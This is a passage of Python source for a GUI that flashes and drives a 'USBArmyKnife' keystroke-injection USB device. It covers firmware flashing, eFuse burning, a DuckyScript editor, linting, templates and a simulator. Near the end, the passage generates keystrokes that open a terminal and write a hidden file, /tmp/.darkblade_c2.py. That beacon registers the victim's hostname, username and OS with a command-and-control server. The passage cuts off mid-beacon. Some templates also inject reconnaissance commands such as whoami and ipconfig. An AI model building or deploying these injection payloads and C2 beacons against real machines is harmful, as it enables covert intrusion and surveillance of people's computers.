                if not output and process.poll() is not None:
                    break
                if output:
                    text = output.decode(errors="ignore")
                    console_widget.insert(tk.END, text)
                    console_widget.see(tk.END)
                    console_widget.update()
                    try:
                        lf.write(text)
                    except Exception:
                        pass
        rc = process.poll()
        return rc

    def detect_devices(self):
        self.flasher_console_text.delete("1.0", tk.END)
        self.flasher_console_text.insert(tk.END, "Detecting devices...\n")
        self.flasher_console_text.update()

        ports = serial.tools.list_ports.comports()
        self.esp_devices = []
        for port in ports:
            if port.vid == 0x303A:
                self.esp_devices.append(port)
        
        if self.esp_devices:
            self.device_combobox["values"] = [f"{p.device} - {p.description}" for p in self.esp_devices]
            self.device_combobox.current(0)
            self.flasher_console_text.insert(tk.END, f"Found {len(self.esp_devices)} devices.\n")
        else:
            self.device_combobox.set("")
            self.device_combobox["values"] = []
            self.flasher_console_text.insert(tk.END, "No devices found. Click 'Connection Help' for setup steps.\n")
            try:
                if messagebox.askyesno("No devices found", "Show connection/setup help?"):
                    self.show_connection_help()
            except Exception:
                pass

    def install_firmware(self):
        device_info = self.device_combobox.get()
        if not device_info:
            self.flasher_console_text.insert(tk.END, "Please select a device first.\n")
            return
        
        device = device_info.split(" - ")[0]

        self.flasher_console_text.delete("1.0", tk.END)
        self.flasher_console_text.insert(tk.END, f"Installing firmware on {device}...\n")
        self.flasher_console_text.update()

        thread = threading.Thread(target=self._install_firmware_thread, args=(device,))
        thread.start()

    def _install_firmware_thread(self, device):
        try:
            if not self._ensure_platformio(self.flasher_console_text):
                return
            # Ensure PlatformIO uses the selected keyboard layout by writing an override file
            self._write_platformio_override()
            env = self._resolve_env_name()
            # Optional full erase to avoid bad persistent settings/partitions
            if self.erase_first_var.get() == 1:
                erase_cmd = (
                    f"pio pkg exec --package \"platformio/tool-esptoolpy\" -- esptool.py "
                    f"--chip esp32s3 --port {device} erase_flash"
                )
                self.run_command(erase_cmd, self.flasher_console_text)
            command = f"pio run -e {env} -t upload --upload-port {device}"
            self.run_command(command, self.flasher_console_text, cwd="USBArmyKnife")
            self.flasher_console_text.insert(tk.END, "\nFirmware installation complete!\n")
            try:
                if messagebox.askyesno("Upload Filesystem?", "Firmware flashed. Upload filesystem now?"):
                    threading.Thread(target=self._upload_filesystem_thread, args=(device,), daemon=True).start()
            except Exception:
                pass
        except Exception as e:
            self.flasher_console_text.insert(tk.END, f"\nError during firmware installation: {e}\n")

    def upload_filesystem(self):
        device_info = self.device_combobox.get()
        if not device_info:
            self.flasher_console_text.insert(tk.END, "Please select a device first.\n")
            return
        
        device = device_info.split(" - ")[0]

        self.flasher_console_text.delete("1.0", tk.END)
        self.flasher_console_text.insert(tk.END, f"Uploading filesystem to {device}...\n")
        self.flasher_console_text.update()

        thread = threading.Thread(target=self._upload_filesystem_thread, args=(device,))
        thread.start()

    def _upload_filesystem_thread(self, device):
        try:
            if not self._ensure_platformio(self.flasher_console_text):
                return
            # Keep override consistent for any code that may read layout at runtime
            self._write_platformio_override()
            env = self._resolve_env_name()
            command = f"pio run -e {env} -t uploadfs --upload-port {device}"
            self.run_command(command, self.flasher_console_text, cwd="USBArmyKnife")
            self.flasher_console_text.insert(tk.END, "\nFilesystem upload complete!\n")
        except Exception as e:
            self.flasher_console_text.insert(tk.END, f"\nError during filesystem upload: {e}\n")

    def read_efuse_summary(self):
        device_info = self.device_combobox.get()
        if not device_info:
            self.efuse_console_text.insert(tk.END, "Please select a device first.\n")
            return
        
        device = device_info.split(" - ")[0]

        self.efuse_console_text.delete("1.0", tk.END)
        self.efuse_console_text.insert(tk.END, f"Reading eFuse summary from {device}...\n")
        self.efuse_console_text.update()

        thread = threading.Thread(target=self._read_efuse_summary_thread, args=(device,))
        thread.start()

    def _read_efuse_summary_thread(self, device):
        try:
            if not self._ensure_platformio(self.efuse_console_text):
                return
            command = f"pio pkg exec --package \"platformio/tool-esptoolpy\" -- espefuse.py --port {device} summary"
            # Capture output for parsing as well as display
            buf = tkcore.Text()
            self.run_command(command, self.efuse_console_text)
            # Try to re-run quickly to capture into a temp buffer for parsing
            tmp = subprocess.run(command, shell=True, capture_output=True, text=True)
            txt = tmp.stdout or ""
            status = self._parse_usb_phy_sel(txt)
            if status:
                self.efuse_console_text.insert(tk.END, f"\nUSB_PHY_SEL status: {status}\n")
                if "UNBURNED" in status:
                    self.efuse_console_text.insert(tk.END, "WARNING: Some T-Dongle-S3 revisions require USB_PHY_SEL; burning is irreversible and risky. Proceed only if device USB works only in DFU/OTG.\n")
        except Exception as e:
            self.efuse_console_text.insert(tk.END, f"\nError reading eFuse summary: {e}\n")

    def toggle_burn_button(self):
        if self.burn_efuse_check_var.get() == 1:
            self.burn_button.config(state=tk.NORMAL)
        else:
            self.burn_button.config(state=tk.DISABLED)

    def burn_efuse(self):
        device_info = self.device_combobox.get()
        if not device_info:
            self.efuse_console_text.insert(tk.END, "Please select a device first.\n")
            return
        
        device = device_info.split(" - ")[0]

        # Check current status first
        try:
            tmp = subprocess.run(
                f"pio pkg exec --package \"platformio/tool-esptoolpy\" -- espefuse.py --port {device} summary",
                shell=True, capture_output=True, text=True
            )
            status = self._parse_usb_phy_sel(tmp.stdout or "")
            if status and "BURNED" in status.upper():
                messagebox.showinfo("eFuse", "USB_PHY_SEL already set. Aborting.")
                return
        except Exception:
            pass

        if not messagebox.askokcancel("Confirmation", "Burning the eFuse is irreversible and may brick your device. Continue?"):
            return
        confirm = simpledialog.askstring("Type to Confirm", "Type I UNDERSTAND to proceed:")
        if (confirm or "").strip().upper() != "I UNDERSTAND":
            return

        self.efuse_console_text.delete("1.0", tk.END)
        self.efuse_console_text.insert(tk.END, f"Burning eFuse on {device}...\n")
        self.efuse_console_text.update()

        thread = threading.Thread(target=self._burn_efuse_thread, args=(device,))
        thread.start()

    def _burn_efuse_thread(self, device):
        try:
            if not self._ensure_platformio(self.efuse_console_text):
                return
            command = f"pio pkg exec --package \"platformio/tool-esptoolpy\" -- espefuse.py --port {device} burn_efuse USB_PHY_SEL 1"
            self.run_command(command, self.efuse_console_text)
            self.efuse_console_text.insert(tk.END, "\neFuse burning complete!\n")
        except Exception as e:
            self.efuse_console_text.insert(tk.END, f"\nError burning eFuse: {e}\n")

    def select_drive(self):
        # Get list of block devices and their mount points
        try:
            result = subprocess.run(
                "lsblk -o NAME,SIZE,TYPE,MOUNTPOINT,MODEL -J",
                shell=True, capture_output=True, text=True
            )
            if result.returncode == 0:
                import json as json_mod
                data = json_mod.loads(result.stdout)
                devices = data.get("blockdevices", [])
                
                # Build list of drives/partitions
                options = []
                for dev in devices:
                    name = dev.get("name", "")
                    size = dev.get("size", "")
                    dtype = dev.get("type", "")
                    mount = dev.get("mountpoint", "")
                    model = dev.get("model", "").strip()
                    
                    # Show disks and partitions
                    if dtype in ["disk", "part"]:
                        label = f"/dev/{name} ({size})"
                        if model:
                            label += f" - {model}"
                        if mount:
                            label += f" [mounted: {mount}]"
                        options.append((label, f"/dev/{name}", mount))
                    
                    # Also check children (partitions)
                    for child in dev.get("children", []):
                        cname = child.get("name", "")
                        csize = child.get("size", "")
                        cmount = child.get("mountpoint", "")
                        clabel = f"  └─ /dev/{cname} ({csize})"
                        if cmount:
                            clabel += f" [mounted: {cmount}]"
                        options.append((clabel, f"/dev/{cname}", cmount))
                
                if not options:
                    messagebox.showinfo("No drives", "No block devices found.")
                    return
                
                # Show selection dialog
                dialog = tk.Toplevel(self)
                dialog.title("Select Drive")
                dialog.geometry("600x400")
                
                tk.Label(dialog, text="Select a drive or partition:").pack(pady=10)
                
                listbox = Listbox(dialog, width=80, height=15)
                listbox.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
                
                for label, dev, mount in options:
                    listbox.insert(tk.END, label)
                
                selected_index = [None]
                
                def on_select():
                    sel = listbox.curselection()
                    if sel:
                        selected_index[0] = sel[0]
                        dialog.destroy()
                
                def on_double_click(event):
                    on_select()
                
                listbox.bind("<Double-Button-1>", on_double_click)
                
                button_frame = tk.Frame(dialog)
                button_frame.pack(pady=5)
                
                tk.Button(button_frame, text="Select", command=on_select).pack(side=tk.LEFT, padx=5)
                tk.Button(button_frame, text="Cancel", command=dialog.destroy).pack(side=tk.LEFT, padx=5)
                tk.Button(button_frame, text="Refresh", command=lambda: [dialog.destroy(), self.select_drive()]).pack(side=tk.LEFT, padx=5)
                
                dialog.wait_window()
                
                if selected_index[0] is not None:
                    _, dev_path, mount_point = options[selected_index[0]]
                    # Prefer mount point if available, otherwise use device path
                    final_path = mount_point if mount_point else dev_path
                    self.selected_drive.set(final_path)
                    self.agent_console_text.insert(tk.END, f"Selected: {final_path} (device: {dev_path})\n")
            else:
                # Fallback to directory dialog
                messagebox.showwarning("lsblk unavailable", "Using directory picker as fallback.")
                drive_path = filedialog.askdirectory()
                if drive_path:
                    self.selected_drive.set(drive_path)
                    self.agent_console_text.insert(tk.END, f"Selected drive: {drive_path}\n")
        except Exception as e:
            self.agent_console_text.insert(tk.END, f"Error listing drives: {e}\nUsing directory picker.\n")
            drive_path = filedialog.askdirectory()
            if drive_path:
                self.selected_drive.set(drive_path)
                self.agent_console_text.insert(tk.END, f"Selected drive: {drive_path}\n")

    def copy_agent_files(self):
        drive_path = self.selected_drive.get()
        if not drive_path:
            self.agent_console_text.insert(tk.END, "Please select the USBArmyKnife drive first.\n")
            return

        device_info = self.device_combobox.get()
        if not device_info:
            self.agent_console_text.insert(tk.END, "Please select a device on the Flasher tab first.\n")
            return

        img_path = (self.agent_img_path_var.get() or "").strip() if hasattr(self, "agent_img_path_var") else ""
        if not img_path or not os.path.isfile(img_path):
            self.agent_console_text.insert(tk.END, "agent.img path is not set or file does not exist. Use 'Create agent.img' or 'Select existing...'.\n")
            return

        self.agent_console_text.delete("1.0", tk.END)
        self.agent_console_text.insert(tk.END, f"Copying agent.img to {drive_path}...\n")
        self.agent_console_text.update()

        thread = threading.Thread(target=self._copy_agent_files_thread, args=(drive_path, img_path), daemon=True)
        thread.start()

    def _copy_agent_files_thread(self, drive_path, img_path):
        try:
            # Copy agent.img to drive root
            shutil.copy2(img_path, os.path.join(drive_path, "agent.img"))
            # Optional: write layout hint for scripts/agent
            try:
                with open(os.path.join(drive_path, "layout.txt"), "w", encoding="utf-8") as lf:
                    lf.write((self._layout_for_firmware() or "en-US") + "\n")
            except Exception:
                pass
            # Drop a small README for the operator
            try:
                with open(os.path.join(drive_path, "AGENT-README.txt"), "w", encoding="utf-8") as rf:
                    rf.write("This drive contains agent.img used by example scripts (USB_MOUNT_DISK_READ_ONLY /agent.img).\n")
            except Exception:
                pass
            self.agent_console_text.insert(tk.END, "agent.img copied successfully!\n")
        except Exception as e:
            self.agent_console_text.insert(tk.END, f"\nError copying agent.img: {e}\n")

    def populate_keyboard_layouts(self):
        """Populate keyboard layouts and prefer US (en-US) by default.
        Values shown in the dropdown match the KEYBOARD_LAYOUT strings expected by the firmware (e.g., win_en-GB).
        """
        layouts = []  # firmware KEYBOARD_LAYOUT tokens, e.g. win_en-GB
        try:
            with open("USBArmyKnife/platformio.ini", "r", errors="ignore") as f:
                for line in f:
                    if "-D LOCALE_" in line:
                        raw = line.split("LOCALE_")[1].split("\t")[0].strip()  # e.g., win_en_GB
                        if raw:
                            # Convert macro token (win_en_GB) -> firmware token (win_en-GB)
                            parts = raw.split("_")
                            if len(parts) >= 3:
                                firmware_tok = "_".join(parts[:-1]) + "-" + parts[-1]
                            else:
                                firmware_tok = raw
                            if firmware_tok not in layouts:
                                layouts.append(firmware_tok)
        except FileNotFoundError:
            pass
        # Insert en-US default at the top
        layouts = ["en-US (default)"] + layouts
        self.layout_combobox["values"] = layouts
        self.layout_combobox.current(0)

    def _selected_layout(self):
        """Return the human/firmware token selected in the combobox."""
        try:
            val = (self.layout_combobox.get() or "").strip()
            return val if val else "en-US (default)"
        except Exception:
            return "en-US (default)"

    def _layout_for_firmware(self):
        """Return the exact argument to use for KEYBOARD_LAYOUT, or None for default en-US."""
        sel = self._selected_layout()
        if sel.lower().startswith("en-us"):
            return None  # default firmware layout is en-US
        return sel

    def _layout_macro_define(self):
        """Return the LOCALE_ macro (e.g., LOCALE_win_en_GB) for the selected layout, or None for en-US."""
        fw = self._layout_for_firmware()
        if not fw:
            return None
        # Convert firmware token (win_en-GB) -> macro (LOCALE_win_en_GB)
        macro_body = fw.replace("-", "_")
        return f"LOCALE_{macro_body}"

    def _write_platformio_override(self):
        """Write platformio_override.ini to include the selected non-US layout at compile time.
        If en-US is selected, we don't add any LOCALE define (en-US is the firmware default).
        """
        override_path = os.path.join("USBArmyKnife", "platformio_override.ini")
        env_name = self._resolve_env_name()
        macro = self._layout_macro_define()
        low_baud = self.low_baud_var.get() == 1 if hasattr(self, "low_baud_var") else False
        if macro or low_baud:
            extra = []
            if macro:
                extra.append(f"-D {macro}")
            content = (
                f"[env:{env_name}]\n"
                f"build_flags = ${{env.build_flags}} {' '.join(extra)}\n"
            )
            if low_baud:
                content += "upload_speed = 115200\n"
        else:
            # Keep flags unchanged
            content = (
                f"[env:{env_name}]\n"
                f"build_flags = ${{env.build_flags}}\n"
            )
        try:
            os.makedirs("USBArmyKnife", exist_ok=True)
            with open(override_path, "w", encoding="utf-8") as f:
                f.write(content)
        except Exception:
            pass

    def _load_prefs(self):
        cfg = {}
        try:
            with open("settings.json", "r", encoding="utf-8") as cf:
                cfg = json.load(cf) or {}
        except Exception:
            cfg = {}
        layout = (cfg.get("layout") or "EN_US")
        # Try to set the combobox to saved layout
        try:
            vals = list(self.layout_combobox["values"]) or []
            if layout not in vals and layout.upper() == "EN_US" and "US" in vals:
                layout = "US"
            if layout in vals:
                self.layout_combobox.set(layout)
        except Exception:
            pass
        # Load persisted C2 API key if available
        try:
            key = (cfg.get("c2_api_key") or "").strip()
            if key:
                self.c2_api_key = key
                # If UI already exists, reflect it
                try:
                    self._update_api_key_ui()
                except Exception:
                    pass
        except Exception:
            pass

    def _save_prefs(self):
        # Merge with existing settings to avoid clobbering other values
        try:
            try:
                with open("settings.json", "r", encoding="utf-8") as cf:
                    cfg = json.load(cf) or {}
            except Exception:
                cfg = {}
            cfg["layout"] = self._selected_layout()
            with open("settings.json", "w", encoding="utf-8") as cf:
                json.dump(cfg, cf, indent=2)
        except Exception:
            pass

    def save_duckyscript(self):
        if not self.armed_var.get():
            messagebox.showwarning("Not Armed", "Enable the 'Armed (consent)' toggle to proceed.")
            return
        drive_path = self.selected_drive.get()
        if not drive_path:
            messagebox.showerror("Error", "Please select the USBArmyKnife drive first.")
            return

        script_content = self._build_script_with_manifest()
        autorun_path = os.path.join(drive_path, "autorun.ds")

        try:
            with open(autorun_path, "w", newline="\r\n", encoding="utf-8") as f:
                f.write(script_content)
            # Write checksum and manifest
            sha = hashlib.sha256(script_content.encode("utf-8")).hexdigest()
            with open(os.path.join(drive_path, "autorun.ds.sha256"), "w") as hf:
                hf.write(sha + "\n")
            manifest = {
                "name": self.manifest_name.get().strip() or "USBArmyKnife Script",
                "target_os": self.target_os.get(),
                "layout": self._layout_for_firmware() or "en-US",
                "notes": self.manifest_notes.get().strip(),
                "packaged_at": datetime.utcnow().isoformat() + "Z"
            }

            with open(os.path.join(drive_path, "manifest.json"), "w", encoding="utf-8") as mf:
                json.dump(manifest, mf, indent=2)
            messagebox.showinfo("Success", "DuckyScript saved successfully!")
            self._audit_log(f"Saved script to {autorun_path}")
        except Exception as e:
            messagebox.showerror("Error", f"Error saving DuckyScript: {e}")

    # ===== DuckyScript Helpers =====
    def _setup_highlight(self):
        try:
            self.duckyscript_editor.tag_configure("kw", foreground="#00d2ff")
            self.duckyscript_editor.tag_configure("comment", foreground="#6c757d")
            self.duckyscript_editor.tag_configure("error", background="#661111", foreground="#ffffff")
        except Exception:
            pass

    def _highlight_editor(self):
        text = self.duckyscript_editor.get("1.0", tk.END)
        # Clear tags
        self.duckyscript_editor.tag_remove("kw", "1.0", tk.END)
        self.duckyscript_editor.tag_remove("comment", "1.0", tk.END)
        # Highlight comments and keywords
        kw = r"^(REM|DELAY|DEFAULT_DELAY|DEFAULTDELAY|DEFAULT_CHAR_DELAY|STRING_DELAY|DELAY_RANDOM|JITTER|STRING|STRINGLN|ENTER|GUI|CTRL|ALT|SHIFT|TAB|ESC|BACKSPACE|SPACE|DELETE|INSERT|UP|DOWN|LEFT|RIGHT|HOME|END|PAGEUP|PAGEDOWN|PRINTSCREEN|MENU|CAPSLOCK|NUMLOCK|SCROLLLOCK|F1|F2|F3|F4|F5|F6|F7|F8|F9|F10|F11|F12|REPEAT|KEYDOWN|KEYUP|HOLD|RELEASE|KEYBOARD_LAYOUT|LED_OFF|LED_ON|LED_BLINK|TFT_OFF|TFT_ON|TFT_TEXT|BEEP|VIBRATE|MOUSE_MOVE|MOUSE_SCROLL|MOUSE_LEFT|MOUSE_RIGHT|MOUSE_MIDDLE|OPENURL|RUN|SHELL|CLIPBOARD_SET|CLIPBOARD_PASTE|WAIT_FOR_WINDOW|WAIT_FOR_TEXT|WAIT_NET|IF|ELSE|ENDIF|WHILE|ENDWHILE|FUNCTION|ENDFUNCTION|CALL|INCLUDE)\b"
        for i, line in enumerate(text.splitlines(), start=1):
            if line.strip().startswith("REM"):
                self.duckyscript_editor.tag_add("comment", f"{i}.0", f"{i}.end")
            m = re.match(kw, line.strip(), flags=re.IGNORECASE)
            if m:
                # Highlight command token at line start
                start_idx = f"{i}.0"
                end_idx = f"{i}.{len(m.group(0))}"
                self.duckyscript_editor.tag_add("kw", start_idx, end_idx)

    def run_lint(self):
        issues = []
        text = self.duckyscript_editor.get("1.0", tk.END).splitlines()
        valid_cmds = {
            "REM","DELAY","DEFAULT_DELAY","DEFAULTDELAY","DEFAULT_CHAR_DELAY","STRING_DELAY","DELAY_RANDOM","JITTER",
            "STRING","STRINGLN","ENTER","GUI","CTRL","ALT","SHIFT","TAB","ESC","BACKSPACE","SPACE","DELETE","INSERT",
            "UP","DOWN","LEFT","RIGHT","HOME","END","PAGEUP","PAGEDOWN","PRINTSCREEN","MENU","CAPSLOCK","NUMLOCK","SCROLLLOCK",
            "F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12",
            "REPEAT","KEYDOWN","KEYUP","HOLD","RELEASE","KEYBOARD_LAYOUT",
            "LED_OFF","LED_ON","LED_BLINK","TFT_OFF","TFT_ON","TFT_TEXT","BEEP","VIBRATE",
            "MOUSE_MOVE","MOUSE_SCROLL","MOUSE_LEFT","MOUSE_RIGHT","MOUSE_MIDDLE",
            "OPENURL","RUN","SHELL","CLIPBOARD_SET","CLIPBOARD_PASTE",
            "WAIT_FOR_WINDOW","WAIT_FOR_TEXT","WAIT_NET",
            "IF","ELSE","ENDIF","WHILE","ENDWHILE","FUNCTION","ENDFUNCTION","CALL","INCLUDE"
        }
        for idx, line in enumerate(text, start=1):
            s = line.strip()
            if not s:
                continue
            if s.upper().startswith("REM"):
                continue
            parts = s.split()
            cmd = parts[0].upper()
            if cmd not in valid_cmds and not re.match(r"^\$[A-Za-z_][A-Za-z0-9_]*\s*=", s):
                issues.append((idx, f"Unknown command '{parts[0]}'"))
            # Single-number timing commands
            if cmd in ("DELAY","DEFAULT_DELAY","DEFAULTDELAY","DEFAULT_CHAR_DELAY","STRING_DELAY","MOUSE_SCROLL"):
                if len(parts) < 2 or not parts[1].isdigit():
                    issues.append((idx, f"{cmd} requires a numeric value"))
            # JITTER n or n%
            if cmd == "JITTER":
                if len(parts) < 2 or not re.match(r"^\d+%?$", parts[1]):
                    issues.append((idx, "JITTER requires a number or percentage (e.g., 10 or 10%)"))
            # DELAY_RANDOM a b
            if cmd == "DELAY_RANDOM":
                if len(parts) < 3 or not (parts[1].isdigit() and parts[2].isdigit()):
                    issues.append((idx, "DELAY_RANDOM requires two numeric millisecond values"))
            # MOUSE_MOVE x y
            if cmd == "MOUSE_MOVE":
                if len(parts) < 3 or not (parts[1].lstrip('-').isdigit() and parts[2].lstrip('-').isdigit()):
                    issues.append((idx, "MOUSE_MOVE requires two integer values (x y)"))
        # Output
        self.lint_output.config(state=tk.NORMAL)
        self.lint_output.delete("1.0", tk.END)
        if issues:
            for ln, msg in issues:
                self.lint_output.insert(tk.END, f"Line {ln}: {msg}\n")
        else:
            self.lint_output.insert(tk.END, "No issues found.\n")
        self.lint_output.config(state=tk.DISABLED)
        return issues

    def insert_template(self):
        # Template Browser dialog with preview and one-click insert
        templates = {
            "Notepad Hello": (
                """REM Description: Open Notepad and type greeting\nGUI r\nDELAY 500\nSTRING notepad\nENTER\nDELAY 500\nSTRING Hello, World!\n"""
            ),
            "Run Dialog": (
                """REM Description: Run dialog and echo\nGUI r\nDELAY 300\nSTRING cmd /c echo ${MESSAGE}\nENTER\n"""
            ),
            "Open URL": (
                """REM Open a URL (Windows)\nGUI r\nDELAY 300\nSTRING cmd /c start https://example.com\nENTER\n"""
            ),
            "Clipboard Paste": (
                """REM Set clipboard and paste\nCLIPBOARD_SET Hello_from_Clipboard\nDELAY 100\nCLIPBOARD_PASTE\n"""
            ),
            "Jitter & Random Delay": (
                """REM Use jitter and random delay between actions\nDEFAULT_DELAY 50\nJITTER 15%\nDELAY_RANDOM 200 400\nSTRING Typing with randomized delays...\nENTER\n"""
            ),
            "Mouse Move & Click": (
                """REM Move cursor and click\nMOUSE_MOVE 100 50\nDELAY 100\nMOUSE_LEFT\nDELAY 200\nMOUSE_RIGHT\n"""
            ),
            "Key Combos": (
                """REM Press CTRL+ALT+DEL via keydown/keyup\nKEYDOWN CTRL\nKEYDOWN ALT\nKEYDOWN DEL\nDELAY 50\nKEYUP DEL\nKEYUP ALT\nKEYUP CTRL\n"""
            ),
            "Function Keys": (
                """REM Use function keys and arrows\nF5\nDELAY 200\nTAB\nTAB\nENTER\nUP\nDOWN\nLEFT\nRIGHT\n"""
            ),
            "Wait for Window/Text": (
                """REM Wait for a window or prompt text\nWAIT_FOR_WINDOW Notepad\nWAIT_FOR_TEXT C:\\>\nSTRING dir\nENTER\n"""
            ),
            "Flow Control": (
                """REM Conditional execution example\n$os = windows\nIF $os == windows\n    GUI r\n    DELAY 300\n    STRING cmd /c whoami\n    ENTER\nELSE\n    GUI r\n    DELAY 300\n    STRING bash -lc whoami\n    ENTER\nENDIF\n"""
            ),
            "LED/TFT/Buzzer": (
                """REM Device feedback\nLED_ON\nLED_BLINK red 2\nTFT_TEXT Demo running...\nBEEP 880 200\nVIBRATE 100\n"""
            ),
            "Run Shell": (
                """REM Launch a shell command\nRUN cmd /c ipconfig /all\nDELAY 500\nRUN powershell Get-Date\n"""
            ),
            "Mouse Scroll": (
                """REM Scroll down a page\nMOUSE_SCROLL 5\n"""
            ),
            "Include File": (
                """REM Include another script file\nINCLUDE helper.ds\n"""
            ),
            "STRINGLN Example": (
                """REM Print a line with newline automatically\nSTRINGLN Printing a full line\n"""
            )
        }

        # Build dialog
        dlg = tk.Toplevel(self)
        dlg.title("Template Browser")
        try:
            dlg.geometry("700x420")
        except Exception:
            pass
        dlg.transient(self)
        dlg.grab_set()

        # Left: list
        left = tk.Frame(dlg)
        left.pack(side=tk.LEFT, fill=tk.Y, padx=8, pady=8)
        lb = Listbox(left, width=28, height=18)
        lb.pack(fill=tk.Y, expand=False)

        # Right: preview
        right = tk.Frame(dlg)
        right.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0,8), pady=8)
        preview = tk.Text(right, wrap=tk.NONE, height=18)
        preview.pack(fill=tk.BOTH, expand=True)

        # Bottom buttons
        btns = tk.Frame(dlg)
        btns.pack(side=tk.BOTTOM, fill=tk.X, padx=8, pady=8)
        ins_btn = tk.Button(btns, text="Insert", command=lambda: do_insert())
        ins_btn.pack(side=tk.RIGHT, padx=5)
        tk.Button(btns, text="Cancel", command=dlg.destroy).pack(side=tk.RIGHT)

        # Populate list
        names = sorted(templates.keys())
        for n in names:
            lb.insert(tk.END, n)
        if names:
            lb.selection_set(0)
            preview.delete("1.0", tk.END)
            preview.insert(tk.END, templates[names[0]])

        def on_select(event=None):
            sel = lb.curselection()
            if not sel:
                return
            name = names[sel[0]]
            preview.config(state=tk.NORMAL)
            preview.delete("1.0", tk.END)
            preview.insert(tk.END, templates[name])
            preview.config(state=tk.NORMAL)

        def do_insert():
            sel = lb.curselection()
            if not sel:
                dlg.destroy()
                return
            name = names[sel[0]]
            self.duckyscript_editor.insert(tk.INSERT, templates[name])
            self._highlight_editor()
            self.run_lint()
            try:
                dlg.destroy()
            except Exception:
                pass

        lb.bind("<<ListboxSelect>>", on_select)
        lb.bind("<Double-Button-1>", lambda e: do_insert())

    def fill_parameters(self):
        text = self.duckyscript_editor.get("1.0", tk.END)
        vars_found = set(re.findall(r"\$\{([^}]+)\}", text))
        values = {}
        for var in vars_found:
            prompt = var
            val = simpledialog.askstring("Parameter", f"Value for {prompt}:")
            if val is None:
                continue
            values[var] = val
        for k, v in values.items():
            text = text.replace("${"+k+"}", v)
        self.duckyscript_editor.delete("1.0", tk.END)
        self.duckyscript_editor.insert(tk.END, text)
        self._highlight_editor()
        self.run_lint()

    def calibrate_delays(self):
        try:
            factor = float(simpledialog.askstring("Calibrate Delays", "Multiplier (e.g. 1.5):", initialvalue="1.0"))
        except Exception:
            return
        if factor <= 0:
            return
        lines = self.duckyscript_editor.get("1.0", tk.END).splitlines()
        out = []
        for line in lines:
            m = re.match(r"^(\s*)(DEFAULT_DELAY|DEFAULTDELAY|DELAY)\s+(\d+)\s*$", line, flags=re.IGNORECASE)
            if m:
                ms = int(m.group(3))
                new_ms = max(0, int(ms*factor))
                out.append(f"{m.group(1)}{m.group(2)} {new_ms}")
            else:
                out.append(line)
        self.duckyscript_editor.delete("1.0", tk.END)
        self.duckyscript_editor.insert(tk.END, "\n".join(out))
        self._highlight_editor()
        self.run_lint()

    def _parse_events(self, text):
        events = []
        for line in text.splitlines():
            s = line.strip()
            if not s or s.upper().startswith("REM"):
                continue
            parts = s.split(" ", 1)
            cmd = parts[0].upper()
            arg = parts[1] if len(parts) > 1 else ""
            if cmd == "DELAY":
                try:
                    ms = int(arg.strip())
                except Exception:
                    ms = 0
                events.append(("DELAY", ms))
            elif cmd == "STRING":
                events.append(("STRING", arg))
            else:
                events.append((cmd, arg))
        return events

    def run_simulation(self):
        if not self.armed_var.get():
            messagebox.showwarning("Not Armed", "Enable the 'Armed (consent)' toggle to proceed.")
            return
        self.sim_list.delete(0, tk.END)
        self._sim_events = self._parse_events(self.duckyscript_editor.get("1.0", tk.END))
        self._sim_index = 0
        self._sim_running = True
        threading.Thread(target=self._simulate_loop, daemon=True).start()
        self._audit_log("Started simulation")

    def _simulate_loop(self):
        while self._sim_running and self._sim_index < len(self._sim_events):
            evt, arg = self._sim_events[self._sim_index]
            self.sim_list.insert(tk.END, f"{self._sim_index+1}: {evt} {arg}")
            self.sim_list.see(tk.END)
            if evt == "DELAY":
                time.sleep(arg/1000.0)
            self._sim_index += 1
        self._sim_running = False

    def step_simulation(self):
        if not self._sim_events:
            self._sim_events = self._parse_events(self.duckyscript_editor.get("1.0", tk.END))
            self._sim_index = 0
        if self._sim_index < len(self._sim_events):
            evt, arg = self._sim_events[self._sim_index]
            self.sim_list.insert(tk.END, f"{self._sim_index+1}: {evt} {arg}")
            self.sim_list.see(tk.END)
            self._sim_index += 1

    def stop_simulation(self):
        self._sim_running = False

    # ----- OS-specific porting -----
    def port_script_now(self):
        tgt = (self.target_os.get() or 'generic').lower()
        if tgt not in ('windows','linux','macos'):
            messagebox.showinfo("Porting", "Select a specific Target OS (windows/linux/macos) first.")
            return
        src = self.duckyscript_editor.get("1.0", tk.END)
        try:
            out = self._port_duckyscript(tgt, src)
            self.duckyscript_editor.delete("1.0", tk.END)
            self.duckyscript_editor.insert(tk.END, out)
            self._highlight_editor()
            self.run_lint()
            messagebox.showinfo("Porting", f"Script ported for {tgt}.")
        except Exception as e:
            messagebox.showerror("Porting", str(e))

    def _on_target_os_changed(self, event=None):
        try:
            tgt = (self.target_os.get() or 'generic').lower()
            if tgt in ('windows','linux','macos'):
                src = self.duckyscript_editor.get("1.0", tk.END)
                out = self._port_duckyscript(tgt, src)
                self.duckyscript_editor.delete("1.0", tk.END)
                self.duckyscript_editor.insert(tk.END, out)
                self._highlight_editor()
                self.run_lint()
        except Exception:
            pass

    def _port_duckyscript(self, target: str, text: str) -> str:
        # If this looks like a PowerShell C2 beacon, replace with a proper Linux/macOS beacon
        if target in ('linux','macos') and ("USB Army Knife C2 Beacon" in text or "Invoke-RestMethod" in text or "/api/beacon" in text):
            # Try to extract server URL from REM header or first URL in text
            server = "http://127.0.0.1:5000"
            for line in text.splitlines():
                if line.strip().upper().startswith("REM SERVER:"):
                    server = line.split(":",1)[1].strip()
                    break
            if server == "http://127.0.0.1:5000":
                m = re.search(r"https?://[\w\.-]+(?::\d+)?", text)
                if m:
                    server = m.group(0)
            # Build a Python beacon (stdlib only) and run it in a terminal
            seq = []
            if target == 'linux':
                seq += ["CTRL ALT T", "DELAY 700"]
            else:
                # macOS: open Terminal via Spotlight
                seq += ["CMD SPACE", "DELAY 300", "STRING Terminal", "ENTER", "DELAY 1000"]
            seq += [
                "STRING cat > /tmp/.darkblade_c2.py <<'PY'", "ENTER",
                "STRING import urllib.request, json, time, os, platform, subprocess", "ENTER",
                f"STRING c2='{server}'", "ENTER",
                "STRING h=platform.node()", "ENTER",
                "STRING try:\n    u=os.getlogin()", "ENTER",
                "STRING except Exception:\n    u=os.getenv('USER') or 'user'", "ENTER",
                "STRING o=platform.platform()", "ENTER",
                "STRING data=json.dumps({'hostname':h,'username':u,'os':o}).encode()", "ENTER",
                "STRING req=urllib.request.Request(c2+'/api/beacon/register',data=data,headers={'Content-Type':'application/json'})", "ENTER",
                "STRING bid=json.loads(urllib.request.urlopen(req,timeout=10).read().decode()).get('beacon_id','')", "ENTER",
